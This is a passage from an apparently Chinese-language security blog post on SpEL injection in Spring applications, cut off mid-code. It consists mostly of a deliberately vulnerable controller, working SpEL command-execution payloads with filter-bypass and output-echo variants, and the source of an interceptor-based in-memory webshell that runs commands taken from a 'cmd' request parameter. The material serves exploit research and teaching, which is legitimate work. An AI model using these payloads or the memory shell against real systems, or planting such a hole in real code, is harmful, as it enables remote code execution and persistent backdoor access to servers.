punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//弹出计算器</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h4><p>获取classloader关键字：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span>Expression</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>#thymeleaf 情况下<span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>thymeleaf<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span>AbstractEngineContext</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>#web服务下通过内置对象<span class="token punctuation">&#123;</span>request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>\"<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>\"<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>\"getRuntime\"<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>\"touch<span class="token operator">/</span>tmp<span class="token operator">/</span>foobar\"<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>username<span class="token punctuation">[</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.script.ScriptEngineManager"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"js"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec('xterm')"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>asdf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="RCE-ver3——回显"><a href="#RCE-ver3——回显" class="headerlink" title="RCE ver3——回显"></a>RCE ver3——回显</h2><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span></span><span class="token class-name">SpelParserConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> spelcontroller <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/spel"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">spelvul</span><span class="token punctuation">(</span><span class="token class-name">String</span> payload<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SpelParserConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BufferedReader"><a href="#BufferedReader" class="headerlink" title="BufferedReader"></a>BufferedReader</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其实这并不是纯粹的回显，因为你需要return这个返回结果，而真实情况一般是不会return这个结果的</p><hr><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"dir"</span><span class="token punctuation">,</span> <span class="token string">".\\"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"GBK"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"asdasdasdasd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的<code>Delimiter</code>是分隔符的意思，我们执行了dir指令，假如想让回显全部显示在一行。那么我们给一点乱七八糟的东西即可</p><hr><h3 id="ResponseHeader"><a href="#ResponseHeader" class="headerlink" title="ResponseHeader"></a>ResponseHeader</h3><p>通用回显</p><p>这种方法需要有一个方法可以<code>addHeader</code>，可是springboot并不自带这个方法。因此获取到Response有些许困难，需要注册一个response进上下文</p><p>代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> spelcontroller <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/spel"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">spelvul</span><span class="token punctuation">(</span><span class="token class-name">String</span> payload<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">StandardEvaluationContext</span> context<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">setVariable</span><span class="token punctuation">(</span><span class="token string">"response"</span><span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SpelParserConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span>#response<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token char">'x-cmd'</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是在响应体里面就会带出<code>x-cmd</code>这个参数</p><hr><h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span>ReflectUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>'<span class="token class-name">InceptorMemShell</span>'<span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64Utils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeFromString</span><span class="token punctuation">(</span>'yv66vgAAA<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来就逐步解析一下这个payload：</p><h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>首先我们需要确认我们的目的，我们目的就是加载一个类，并且将其实例化。这里选择了springboot自带的工具类<code>ReflectUtils</code>，因为他识别base64字节，然后加载它。很方便。</p><h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><p>加载一个类需要指定classloader，我们肯定选定当前线程上下文的classLoader<br><code>T(java.lang.Thread).currentThread().getContextClassLoader()</code></p><p>第一个payload用到了MLet这个类，实际上是URLClassLoader的实现类</p><hr><h3 id="springboot内存马"><a href="#springboot内存马" class="headerlink" title="springboot内存马"></a>springboot内存马</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">HandlerInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">RequestContextHolder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span><span class="token class-name">AbstractHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InceptorMemShell</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"staart"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebApplicationContext</span><span class="token punctuation">)</span> <span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">RequestMappingHandlerMapping</span> mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            field <span class="token operator">=</span> <span class="token class-name">AbstractHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"adaptedInterceptors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerInterceptor</span><span class="token punctuation">></span></span> adaptInterceptors <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            adaptInterceptors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerInterceptor</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">InceptorMemShell</span> evilInterceptor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InceptorMemShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        adaptInterceptors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>evilInterceptor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>PrintWriter</span> printWriter <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">ProcessBuilder</span> builder<span class="token punctuation">;</span>                <span class="token class-name">String</span> o <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token 